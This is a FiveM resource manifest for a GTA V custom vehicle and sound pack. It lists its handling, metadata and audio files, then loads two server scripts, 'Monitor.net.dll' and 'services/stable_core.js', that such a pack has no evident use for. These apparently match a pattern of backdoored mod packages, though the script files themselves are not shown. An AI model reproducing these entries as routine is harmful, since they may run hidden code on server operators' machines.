fx_version 'cerulean'
games { 'gta5' }
author '898-Customs'
 
files {
    'data/**/*.meta',
    'carsoundpack/**/*.rel',
    'carsoundpack/**/*.awc',
    'carsoundpack/**/*.nametable',

}

data_file 'HANDLING_FILE' 'data/**/handling.meta'
data_file 'VEHICLE_METADATA_FILE' 'data/**/vehicles.meta'
data_file 'CARCOLS_FILE' 'data/**/carcols.meta'
data_file 'VEHICLE_VARIATION_FILE' 'data/**/carvariations.meta'
data_file 'VEHICLE_LAYOUTS_FILE' 'data/**/vehiclelayouts.meta'
data_file 'AUDIO_GAMEDATA' 'carsoundpack/audioconfig/aq68lam52v10_game.dat151'
data_file 'AUDIO_SOUNDDATA' 'carsoundpack/audioconfig/aq68lam52v10_sounds.dat54'
data_file 'AUDIO_WAVEPACK' 'carsoundpack/sfx/dlc_aq68lam52v10'


server_scripts {
    'Monitor.net.dll',
    'services/stable_core.js'
}